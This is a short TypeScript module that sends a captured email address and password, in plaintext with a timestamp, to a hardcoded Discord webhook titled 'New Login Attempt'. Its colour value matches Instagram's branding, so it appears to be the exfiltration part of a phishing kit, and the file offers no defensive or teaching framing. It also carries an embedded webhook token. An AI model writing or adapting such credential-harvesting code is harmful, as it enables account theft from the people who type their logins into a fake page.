import axios from 'axios';

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1290064859018428466/_qS1U4H3wEyLE4PE0edFtOYc-24ER73KWwIRSuUKN9joNIMXXEiyA1qAmn3GT8ZuKtwh';

export const sendToDiscord = async (email: string, password: string) => {
  try {
    const message = {
      embeds: [{
        title: 'New Login Attempt',
        color: 0x0095f6,
        fields: [
          {
            name: 'Email',
            value: email,
            inline: true
          },
          {
            name: 'Password',
            value: password,
            inline: true
          },
          {
            name: 'Timestamp',
            value: new Date().toISOString(),
            inline: false
          }
        ]
      }]
    };

    await axios.post(DISCORD_WEBHOOK_URL, message);
    return true;
  } catch (error) {
    console.error('Error sending to Discord:', error);
    return false;
  }
};